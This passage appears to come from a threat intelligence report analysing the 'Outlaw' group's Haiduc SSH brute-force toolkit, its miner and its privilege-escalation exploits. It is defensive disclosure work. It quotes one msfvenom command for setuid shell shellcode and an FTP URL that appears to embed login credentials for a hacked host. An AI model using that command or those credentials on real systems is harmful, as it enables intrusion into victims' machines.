Below is an overview of the most significant findings of the files from the compromised FTP
related to the operation.

The compromised FTP contained various files and tools the attackers used. The first files found
were configuration files for some toolsets. From part of one script, we recovered code that we
used to obtain a list of 80 million IP addresses. Further research suggested it was the way to
generate a randomized target list, which would make uncovering the real target within the
decoy systems more difficult.
".d.php" returned all the parameters. Submitting each parameter to the URL
/128[.]199[.]255[.]180/src/[.]xpf/ips/$param returns a list of IP addresses for each particular
parameter.

Figure 1. Parameter returns an IP address
All the IP addresses were saved on the lists, called by the invoking parameter with the
following script:

Figure 2. Script saving all the listed IP addresses into a text file

Figure 3. All the downloaded files
The supposed studio or the site itself has no business relevance, with no domain name
linked to its business. It is likely that the whole website is just a covert page used to
confuse the researchers and to disguise their operations.

This was the only seemingly working version of the toolset in development. It had various
parts of open-source codes from other operations, and its initial purpose was to build an
IRC-operated XMR miner with the ability to mask itself as another process. The Linux
hacking tool “Shark” was found within these files.

Figure 4 and 5. Comments in the Romanian language re: the IRC bouncer

We also found open-source hacking tools with custom wrap-up bash scripts with
comments written in the Romanian language. Among the files, there was a new toolkit

called Haiduc (detected by Trend Micro as Hacktool.Linux.SSHBRUTE.A), which translates
to "An Outlaw," that was not seen before. It is, however, found for download on the
website, arhivecodex[.]tk, which also hosts speed.py, the script for a performance check
related to a Monero mining rig.

Figure 6. Screenshot of the website's front page
The hacking tool was tested to scan the C&C servers while monitoring the traffic. It simply
brute forced the SSH for credentials using the given wordlist, which was also captured
from the hackers (the group which we named “Outlaw”). We tested whether this is some
trap for script kiddies, but Haiduc did only what it was supposed to do — brute force the
SSH credentials with the list of targets and wordlist. According to the content of the
"Classes" directory (discussed later in this document), the tool is ready to be used for
cyberattacks against listed companies, either to perform DDoS attacks or brute force the
SSH service credentials on the target’s server, with a randomized order of the scanned IP
addresses to make the detection more difficult.

We discussed the Haiduc kit toolset in the blog, including the ways hackers used it. Here,
we discuss its toolset with the bash wrappers, including so-called "Class files". Each class

file stands for a certain company and contains the first two octets of a subnet. Other scripts
from the toolkit generate the remaining two octets of the IP address for scanning. Running
Haiduc also revealed a list of compromised devices, with more than 185,000 distinct IP
addresses.

The file, gasite.txt, contains the loot and is the final output of the Haiduc tool, where the brute
forcing resulted in 65,288 possibly compromised hosts.

Figure 12. The file Ovh generates a wordlist of 234 certain usernames.

Figure 13. The Pass wordlist generates another wordlist of 790 lines.
The file, R, is a randomness generator for the scanner wrapper file, a, which makes the
scanning more difficult to identify.

Figure 17. Classes
These "classes" are the first two octets from subnetworks (subnet) of the abovementioned
companies. As shown in the examples below.

Among the files found on the compromised FTP server, there is also a list of the hosts
compromised using the Haiduc tool. It is a 65 thousand-long list of IP addresses,
usernames, and passwords for SSH access. The list of targets include smart devices,
servers, and network components, among others.
The following are only some of the compromised hosts:


Firewall of a hotel in South Korea: We detected two backdoors in their root file
system. We notified the Korean CERT and have yet to receive a response at the
time of writing.

The Ubuntu privilege exploit was found in the file, Non, which is another privilege escalation
tool related to the exploit for CVE-2017-16995.

Figure 27. Suspicious strings found in the file, non
The threat actors used a variant of a hacking tool called "Faker" to spoof the properties of
the process running after the initial exploitation to mask the malware-related process.
Specifically, this was used to hide the IRC C&C communications from security monitoring
during the initial exploitation. It was also used to disguise the Monero miner.

Figure 28. The file, h.c, is also the hacking tool Faker

The next exploits found on the system were based on Pokemon and Dirty Cow with a
customized variant of shellcode (The Pokemon exploit is also based on the Dirty Cow
vulnerability.).

Figure 29. Pokemon and Dirty Cow-related exploits
Dirty Cow is a vulnerability that affects all Linux-based operating systems and even
Android. It is a local privilege escalation bug that can be used with other exploits to allow
remote execution to get root access on the host. The other exploit was the aforementioned
non file in this case.
Shellcode was generated with the command “msfvenom -p linux/x64/exec CMD=/bin/bash
PrependSetuid=True -f elf | xxd -I". In this case, it is a standard shellcode generated by the
Metasploit suite msfvenom tool. This toolset is popular in the cybercriminal underground
because it is open-source and readily available, and that it still works on most systems.

Common Address Redundancy Protocol (CARP) is a pfsense tool that can be used to build
a firewall failover or IPSec base channel between two hosts. According to the file

config.log, it seems to be used to create HA cluster from both of the hacked hosts
mail[.]rajukdhaka[.]gov[.]bd (202.79.16.178) and hxxp://www[.]nichidomuseum[.]or[.]jp/english/ (ftp://museum@museum04@153[.]122[.]156[.]232/Mail/n3).
